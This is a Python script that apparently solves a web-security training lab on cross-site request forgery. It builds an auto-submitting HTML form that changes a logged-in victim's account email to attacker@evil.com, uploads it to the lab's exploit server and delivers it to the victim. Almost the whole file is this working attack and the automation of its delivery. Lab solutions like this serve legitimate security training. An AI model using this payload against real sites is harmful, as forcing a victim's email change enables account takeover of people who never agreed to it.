import argparse
import sys
import requests

# CSRF labs are exploited by hosting an HTML page on the exploit server and
# delivering it to the victim. Python cannot BE the cross-site victim browser,
# but it can drive the exploit server's store + deliver API, which is what the
# "Deliver to victim" button does. So this script takes the exploit server URL
# and the lab URL, uploads the PoC, and delivers it.

parser = argparse.ArgumentParser(description="Solve CSRF lab 1 (no defenses)")
parser.add_argument("exploit_server", help="Exploit server URL (https://exploit-...exploit-server.net)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--email", default="attacker@evil.com", help="Email to set on the victim account")
args = parser.parse_args()

exploit_server = args.exploit_server.rstrip("/")
lab_url = args.lab_url.rstrip("/")

# the CSRF PoC: an auto-submitting form that posts to the change-email endpoint.
# the lab has no defenses (no CSRF token), so the victim's session cookie - sent
# automatically by the browser - is enough to authorize the change.
poc = f"""<html>
  <body>
    <form action="{lab_url}/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="{args.email}" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>"""

# the exploit server accepts a form post to store and/or deliver the response.
def exploit_action(form_action):
    return requests.post(exploit_server + "/", data={
        "urlIsHttps": "true",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": poc,
        "formAction": form_action,
    })

print("[*] Storing the CSRF PoC on the exploit server...")
exploit_action("STORE")

print("[*] Delivering the exploit to the victim...")
exploit_action("DELIVER_TO_VICTIM")

# check whether the lab is now solved
status = requests.get(lab_url + "/").text
if "is-solved" in status or "Congratulations" in status:
    print("[+] Lab solved!")
else:
    print("[!] Delivered. If not solved yet, give the victim a moment and re-check.")
